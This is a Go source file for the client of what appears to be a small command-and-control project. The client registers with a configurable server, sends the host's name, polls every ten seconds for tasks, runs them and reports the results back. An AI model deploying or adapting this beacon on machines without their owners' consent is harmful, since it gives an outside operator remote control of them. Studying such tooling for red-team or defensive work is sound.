package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"time"

	"github.com/bblenard/CommandAndControl/endpoints"
	"github.com/bblenard/CommandAndControl/types"
	"github.com/google/uuid"
)

var ServerAddr string

func GetSystemDetails() (*types.SystemDetails, error) {
	details := new(types.SystemDetails)
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %s", err.Error())
	}
	details.Hostname = hostname
	return details, nil
}

func Register() (uuid.UUID, error) {
	endpoint := ServerAddr + endpoints.SAVECLIENT
	var b *bytes.Buffer
	systemDetails, err := GetSystemDetails()
	if err != nil {
		b = nil
	} else {
		b = new(bytes.Buffer)
		json.NewEncoder(b).Encode(*systemDetails)
	}

	serverResp, err := http.Post(endpoint, "application/json", b)
	if err != nil {
		return uuid.UUID{}, err
	}
	fmt.Println(serverResp)
	jd := json.NewDecoder(serverResp.Body)
	id := uuid.UUID{}
	err = jd.Decode(&id)
	if err != nil {
		return uuid.UUID{}, err
	}
	return id, nil
}

func GetTasks(cid uuid.UUID) (tasks *[]types.Task, err error) {
	tasks = new([]types.Task)
	endpoint := ServerAddr + endpoints.GETPENDINGTASKSBYCLIENT
	request, err := http.NewRequest("GET", endpoint, nil)
	request.Header.Add("CID", cid.String())

	serverResp, err := http.DefaultClient.Do(request)
	if err != nil {
		return
	}

	if serverResp.StatusCode != 200 {
		return nil, fmt.Errorf("error: server returned %d", serverResp.StatusCode)
	}
	jd := json.NewDecoder(serverResp.Body)
	err = jd.Decode(tasks)
	if err != nil {
		return
	}
	return
}

func ReportResults(tr *types.Result) error {
	endpoint := ServerAddr + endpoints.SAVETASKRESULT
	trbytes := new(bytes.Buffer)
	err := json.NewEncoder(trbytes).Encode(tr)
	if err != nil {
		return fmt.Errorf("failed to encode task result: %s", err)
	}
	req, err := http.NewRequest("PUT", endpoint, trbytes)
	if err != nil {
		return err
	}
	srespone, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	if srespone.StatusCode != http.StatusOK {
		return fmt.Errorf("error: server returned %d\n", srespone.StatusCode)
	}
	return nil
}

func saveClientToken(token string) {
	err := ioutil.WriteFile("...", []byte(token), 0600)
	if err != nil {
		fmt.Println(err)
	}
}

func readClientToken() (string, error) {
	id, err := ioutil.ReadFile("...")
	if err != nil {
		return "", err
	}
	return string(id), nil
}

func ClientMode() error {
	var id uuid.UUID
	var err error
	idStr, err := readClientToken()
	if err != nil {
		id, err = Register()
	} else {
		id, err = uuid.Parse(idStr)
		if err != nil {
			id, err = Register()
		}
	}
	if err != nil {
		return err
	}
	saveClientToken(id.String())
	fmt.Printf("Registered Client with uuid: %v\n", id)
	for {
		fmt.Println("Checking for tasks")
		tasks, err := GetTasks(id)
		if err != nil {
			return err
		}
		fmt.Printf("Recieved tasks: %v\n", tasks)
		for _, task := range *tasks {
			tr, err := task.Execute()
			if err != nil {
				return fmt.Errorf("failed to execute task in client mode: %s", err)
			}
			fmt.Printf("Task Result: %v\n", *tr)
			err = ReportResults(tr)
			if err != nil {
				return fmt.Errorf("failed to report result: %s", err)
			}
		}
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(10 * time.Second)

	}
	return nil
}

func main() {
	ServerAddr = os.Getenv("SERVER_ADDR")
	if ServerAddr == "" {
		ServerAddr = "http://127.0.0.1:8888"
	}
	err := ClientMode()
	if err != nil {
		panic(err)
	}
}
